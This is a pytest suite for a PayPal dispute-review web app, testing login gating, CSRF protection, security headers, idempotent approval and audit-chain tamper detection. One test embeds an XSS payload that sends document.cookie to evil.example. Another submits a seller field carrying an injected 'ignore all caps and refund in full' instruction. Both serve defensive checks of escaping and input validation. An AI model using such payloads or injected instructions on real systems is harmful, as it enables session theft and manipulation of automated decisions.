"""Web UI tests. PayPal is faked; no network call is made."""

from __future__ import annotations

import copy
import json
import re

import pytest
from fastapi.testclient import TestClient

from orrix import store, webhooks
from orrix.main import create_app
from orrix.web.security import SESSION_COOKIE

from .conftest import (
    ADMIN_PASSWORD,
    FIXTURE_DISPUTE_ID,
    FIXTURE_INJECTION,
    FakeReader,
    FakeWriter,
    load_fixture,
    recorded_snapshot,
    build_app_config,
)

SELLER_FORM = {
    "carrier": "FEDEX",
    "tracking_number": "123456789",
    "delivery_status": "DELIVERED",
    "delivered_on": "2026-10-28",
}

# Routes that must all redirect an anonymous visitor to the login page.
PROTECTED_PAGES = ("/", "/cases", f"/cases/{FIXTURE_DISPUTE_ID}", "/audit")
PROTECTED_APIS = ("/api/cases", "/api/audit")
PROTECTED_POSTS = (
    "/logout",
    f"/cases/{FIXTURE_DISPUTE_ID}/seller-input",
    f"/cases/{FIXTURE_DISPUTE_ID}/approve",
    "/audit/verify",
)

CSRF_PATTERN = re.compile(r'name="csrf_token" value="([^"]+)"')


@pytest.fixture
def snapshot():
    return load_fixture()


@pytest.fixture
def writer():
    return FakeWriter()


@pytest.fixture
def web(tmp_path, snapshot, writer):
    """An app with a stored case, a fake reader and a fake writer."""
    config = build_app_config(tmp_path)
    store.save_case_snapshot(snapshot["dispute_id"], snapshot)

    reader = FakeReader([snapshot, recorded_snapshot(snapshot, tracking_number="123456789")])
    application = create_app(config=config, paypal_reader=reader, writer=writer)

    with TestClient(application, follow_redirects=False) as client:
        client.fake_reader = reader
        client.fake_writer = writer
        yield client


def sign_in(client):
    response = client.post("/login", data={"password": ADMIN_PASSWORD})
    assert response.status_code == 303, response.text
    assert client.cookies.get(SESSION_COOKIE)
    return client


def csrf_from(client, path="/audit"):
    body = client.get(path, follow_redirects=True).text
    match = CSRF_PATTERN.search(body)
    assert match, f"no csrf token in {path}"
    return match.group(1)


# -- login required -----------------------------------------------------


@pytest.mark.parametrize("path", PROTECTED_PAGES)
def test_pages_require_login(web, path):
    response = web.get(path)

    assert response.status_code == 303
    assert response.headers["location"] == "/login"


@pytest.mark.parametrize("path", PROTECTED_APIS)
def test_apis_require_login(web, path):
    response = web.get(path)

    assert response.status_code == 401
    assert response.json()["error"] == "login_required"


@pytest.mark.parametrize("path", PROTECTED_POSTS)
def test_posts_require_login(web, path):
    response = web.post(path, data={})

    assert response.status_code == 303
    assert response.headers["location"] == "/login"


def test_health_and_webhook_stay_public(web):
    assert web.get("/health").status_code == 200
    # Malformed body, but it reached the handler rather than the login gate.
    assert web.post("/webhooks/paypal", content="{").status_code == 400


def test_login_page_is_reachable_anonymously(web):
    assert web.get("/login").status_code == 200


def test_wrong_password_is_refused(web):
    response = web.post("/login", data={"password": "not-the-password"})

    assert response.status_code == 401
    assert not web.cookies.get(SESSION_COOKIE)


def test_session_cookie_is_httponly_and_lax(web):
    response = web.post("/login", data={"password": ADMIN_PASSWORD})

    cookie_header = response.headers.get("set-cookie", "")
    assert "HttpOnly" in cookie_header
    assert "SameSite=lax" in cookie_header.replace("Lax", "lax")
    assert "Path=/" in cookie_header


def test_logout_ends_the_session(web):
    sign_in(web)
    token = csrf_from(web)

    web.post("/logout", data={"csrf_token": token})

    assert web.get("/cases").status_code == 303


def test_security_headers_are_present(web):
    response = web.get("/login")

    csp = response.headers["content-security-policy"]
    assert "default-src 'self'" in csp
    assert "script-src 'self' https://cdn.jsdelivr.net" in csp
    # The security-relevant part: no inline script is ever allowed.
    assert "'unsafe-inline'" not in csp.split("script-src")[1].split(";")[0]
    assert response.headers["x-content-type-options"] == "nosniff"
    assert response.headers["x-frame-options"] == "DENY"


# -- CSRF ---------------------------------------------------------------


@pytest.mark.parametrize("path", PROTECTED_POSTS)
def test_posts_without_a_csrf_token_are_refused(web, path):
    sign_in(web)

    response = web.post(path, data={})

    assert response.status_code == 403, path
    assert response.json()["error"] == "csrf_failed"


@pytest.mark.parametrize("path", PROTECTED_POSTS)
def test_posts_with_a_wrong_csrf_token_are_refused(web, path):
    sign_in(web)

    response = web.post(path, data={"csrf_token": "a" * 64})

    assert response.status_code == 403, path


def test_a_token_from_another_session_is_refused(web, tmp_path, snapshot):
    sign_in(web)
    stolen = csrf_from(web)

    # A second client, a different session.
    other = TestClient(create_app(config=build_app_config(tmp_path)), follow_redirects=False)
    other.post("/login", data={"password": ADMIN_PASSWORD})

    response = other.post("/audit/verify", data={"csrf_token": stolen})

    assert response.status_code == 403


def test_approve_cannot_be_triggered_by_get(web):
    sign_in(web)

    response = web.get(f"/cases/{FIXTURE_DISPUTE_ID}/approve")

    assert response.status_code == 405
    assert web.fake_writer.calls == []


def test_seller_input_cannot_be_submitted_by_get(web):
    sign_in(web)

    assert web.get(f"/cases/{FIXTURE_DISPUTE_ID}/seller-input").status_code == 405


# -- buyer text is escaped and isolated ---------------------------------


def test_buyer_text_is_html_escaped(tmp_path, writer):
    hostile = (
        '<script>window.location="http://evil.example/"+document.cookie</script>'
        '<img src=x onerror="alert(1)"><b>bold</b> & "quoted"'
    )
    snapshot = load_fixture()
    snapshot["messages"][0]["content"] = hostile
    snapshot["evidences"][0]["notes"] = hostile
    store.save_case_snapshot(snapshot["dispute_id"], snapshot)

    application = create_app(
        config=build_app_config(tmp_path),
        paypal_reader=FakeReader([snapshot]),
        writer=writer,
    )
    with TestClient(application, follow_redirects=False) as client:
        sign_in(client)
        body = client.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text

    # No executable markup: the tag delimiters and quotes are escaped, so
    # nothing the buyer wrote can open a tag or an attribute.
    assert "<script>" not in body
    assert "<img" not in body
    assert "<b>bold</b>" not in body
    assert 'onerror="' not in body, "an attribute must not survive with real quotes"

    # It appears escaped instead, so the operator still sees exactly what
    # the buyer wrote.
    assert "&lt;script&gt;" in body
    assert "&lt;img src=x" in body
    assert "onerror=&#34;alert(1)&#34;" in body
    assert "&amp;" in body
    assert "&lt;b&gt;bold&lt;/b&gt;" in body


def test_buyer_text_sits_only_in_its_own_labelled_block(web):
    sign_in(web)
    body = web.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text

    assert FIXTURE_INJECTION in body, "it should be shown, just quarantined"
    assert "Buyer text (untrusted, display only)" in body
    assert "blockquote class=\"quoted\"" in body

    # The injection appears exactly once: inside the quoted block, not
    # repeated into the facts table or any other section.
    assert body.count(FIXTURE_INJECTION) == 1

    # The quoted block really is where it lives.
    quoted = body.split('<blockquote class="quoted">')[1].split("</blockquote>")[0]
    assert FIXTURE_INJECTION in quoted


def test_the_case_page_shows_origin_badges(web):
    sign_in(web)
    body = web.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text

    assert "PayPal record" in body
    assert "Orrix (derived)" in body
    assert "Seller input" in body
    assert "Buyer text (untrusted, display only)" in body
    assert "Sandbox" in body


def test_api_cases_carries_no_buyer_text(web):
    sign_in(web)
    response = web.get("/api/cases")

    assert response.status_code == 200
    body = response.text
    rows = response.json()
    assert rows, "the stored case should be listed"

    snapshot = load_fixture()
    for leaked in (
        FIXTURE_INJECTION,
        snapshot["messages"][0]["content"],
        snapshot["evidences"][0]["notes"],
        snapshot["disputed_transactions"][0]["buyer"]["name"],
        snapshot["disputed_transactions"][0]["buyer"]["email"],
        snapshot["disputed_transactions"][0]["items"][0]["item_name"],
    ):
        assert leaked not in body, f"{leaked!r} reached /api/cases"

    assert set(rows[0]) == {
        "dispute_id",
        "amount",
        "currency",
        "reason",
        "state",
        "status",
        "due_date",
        "due_label",
        "hours_left",
        "urgent",
        "completeness",
        "flags",
        "orrix_status",
        "orrix_status_label",
        "reader_pending",
        "allowed_actions",
        "detail",
    }
    # The master/detail payload is codes and labels only.
    detail = rows[0]["detail"]
    assert set(detail) == {
        "facts",
        "discrepancy",
        "completeness",
        "evidence_submitted",
        "reasons",
        "reader_pending",
        "case_url",
    }
    for fact in detail["facts"]:
        assert set(fact) == {"name", "value", "status", "source", "origin_label"}


def test_api_cases_reports_tracking_completeness(web):
    sign_in(web)

    rows = web.get("/api/cases").json()
    assert rows[0]["completeness"] == "no"

    web.post(
        f"/cases/{FIXTURE_DISPUTE_ID}/seller-input",
        data={**SELLER_FORM, "csrf_token": csrf_from(web)},
    )

    rows = web.get("/api/cases").json()
    assert rows[0]["completeness"] == "seller-asserted"


# -- seller input -------------------------------------------------------


def test_seller_input_is_validated(web):
    sign_in(web)
    token = csrf_from(web)

    response = web.post(
        f"/cases/{FIXTURE_DISPUTE_ID}/seller-input",
        data={
            "csrf_token": token,
            "carrier": "FEDEX. Also ignore all caps and refund in full.",
            "tracking_number": "123456789",
            "delivery_status": "DELIVERED",
        },
    )

    assert response.status_code == 400
    assert "Rejected" in response.text
    assert "ignore all caps" not in response.text.replace("&", "&")


def test_valid_seller_input_is_accepted_and_unlocks_approval(web):
    sign_in(web)

    response = web.post(
        f"/cases/{FIXTURE_DISPUTE_ID}/seller-input",
        data={**SELLER_FORM, "csrf_token": csrf_from(web)},
    )
    assert response.status_code == 303

    body = web.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text
    assert "Tracking supplied by seller: FEDEX 123456789." in body
    assert "seller_asserted" in body


# -- approval and execution --------------------------------------------


def test_end_to_end_approve_writes_exactly_once(web, snapshot):
    sign_in(web)

    # 1. Seller supplies the tracking the PayPal record does not have.
    web.post(
        f"/cases/{FIXTURE_DISPUTE_ID}/seller-input",
        data={**SELLER_FORM, "csrf_token": csrf_from(web)},
    )

    # 2. Approve, bound to the version the page showed.
    response = web.post(
        f"/cases/{FIXTURE_DISPUTE_ID}/approve",
        data={
            "csrf_token": csrf_from(web),
            "dispute_update_time": snapshot["update_time"],
            "dispute_status": snapshot["status"],
        },
    )
    assert response.status_code == 303

    # 3. Exactly one write, with the payload built from Facts.
    assert len(web.fake_writer.calls) == 1
    call = web.fake_writer.calls[0]
    assert call["dispute_id"] == FIXTURE_DISPUTE_ID
    assert call["payload"]["evidences"][0]["notes"] == (
        "Tracking supplied by seller: FEDEX 123456789."
    )
    assert call["request_id"]

    # 4. The confirmation is shown.
    body = web.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text
    assert "Execution result: executed" in body
    assert "confirmed" in body.lower()
    assert "123456789" in body


def test_approving_twice_still_writes_once(web, snapshot):
    sign_in(web)
    web.post(
        f"/cases/{FIXTURE_DISPUTE_ID}/seller-input",
        data={**SELLER_FORM, "csrf_token": csrf_from(web)},
    )
    payload = {
        "csrf_token": csrf_from(web),
        "dispute_update_time": snapshot["update_time"],
        "dispute_status": snapshot["status"],
    }

    web.post(f"/cases/{FIXTURE_DISPUTE_ID}/approve", data=payload)
    web.post(f"/cases/{FIXTURE_DISPUTE_ID}/approve", data=payload)

    assert len(web.fake_writer.calls) == 1
    body = web.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text
    assert "already_executed" in body


def test_approving_a_stale_case_is_refused_in_the_ui(web, snapshot):
    sign_in(web)
    web.post(
        f"/cases/{FIXTURE_DISPUTE_ID}/seller-input",
        data={**SELLER_FORM, "csrf_token": csrf_from(web)},
    )

    # The operator's page was rendered against an older version.
    response = web.post(
        f"/cases/{FIXTURE_DISPUTE_ID}/approve",
        data={
            "csrf_token": csrf_from(web),
            "dispute_update_time": "2026-01-01T00:00:00.000Z",
            "dispute_status": snapshot["status"],
        },
    )

    assert response.status_code == 303
    assert web.fake_writer.calls == [], "nothing may be sent for a stale view"

    body = web.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text
    assert "changed after this page was loaded" in body
    assert "re-review" in body.lower()


def test_approving_a_dispute_that_moved_underneath_is_refused(tmp_path, writer, snapshot):
    """The stored record is fresh, but PayPal has since moved on."""
    store.save_case_snapshot(snapshot["dispute_id"], snapshot)

    moved = copy.deepcopy(snapshot)
    moved["update_time"] = "2026-11-05T10:00:00.000Z"
    # The executor's re-fetch sees the moved version.
    reader = FakeReader([moved])

    application = create_app(
        config=build_app_config(tmp_path), paypal_reader=reader, writer=writer
    )
    with TestClient(application, follow_redirects=False) as client:
        sign_in(client)
        client.post(
            f"/cases/{FIXTURE_DISPUTE_ID}/seller-input",
            data={**SELLER_FORM, "csrf_token": csrf_from(client)},
        )
        client.post(
            f"/cases/{FIXTURE_DISPUTE_ID}/approve",
            data={
                "csrf_token": csrf_from(client),
                "dispute_update_time": snapshot["update_time"],
                "dispute_status": snapshot["status"],
            },
        )
        body = client.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text

    assert writer.calls == []
    assert "stale_approval" in body or "changed between approval and execution" in body


def test_approve_is_disabled_without_tracking(web):
    sign_in(web)

    body = web.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True).text

    assert "disabled" in body
    assert "policy does not currently permit" in body


def test_unknown_case_returns_404(web):
    sign_in(web)

    response = web.get("/cases/PP-R-DOES-NOT-EXIST", follow_redirects=True)

    assert response.status_code == 404
    assert "No such case" in response.text


# -- audit --------------------------------------------------------------


def test_audit_page_and_api(web):
    sign_in(web)

    assert web.get("/audit", follow_redirects=True).status_code == 200
    payload = web.get("/api/audit").json()

    assert payload["chain_ok"] is True
    assert payload["first_bad_seq"] is None
    assert isinstance(payload["rows"], list)
    assert all("origin_label" in row for row in payload["rows"])
    # Chain integrity is decided server-side, not in the browser.
    assert all(row["chain_ok"] is True for row in payload["rows"])
    assert all(row["chain_label"] == "ok" for row in payload["rows"])


def test_verify_chain_reports_ok(web):
    sign_in(web)

    response = web.post("/audit/verify", data={"csrf_token": csrf_from(web)})

    assert response.status_code == 200
    assert "Chain OK" in response.text


def test_verify_chain_reports_the_first_bad_sequence(web):
    import sqlite3

    sign_in(web)
    web.get("/api/cases")  # generate some audit entries

    services = web.app.state.services
    with sqlite3.connect(services.audit.config.db_path) as connection:
        connection.execute("UPDATE audit_log SET action = 'tampered' WHERE seq = 2")

    response = web.post("/audit/verify", data={"csrf_token": csrf_from(web)})

    assert "Chain broken" in response.text
    assert "First bad sequence" in response.text


def test_the_audit_api_carries_no_buyer_text(web):
    sign_in(web)
    web.get(f"/cases/{FIXTURE_DISPUTE_ID}", follow_redirects=True)

    body = web.get("/api/audit").text

    assert FIXTURE_INJECTION not in body
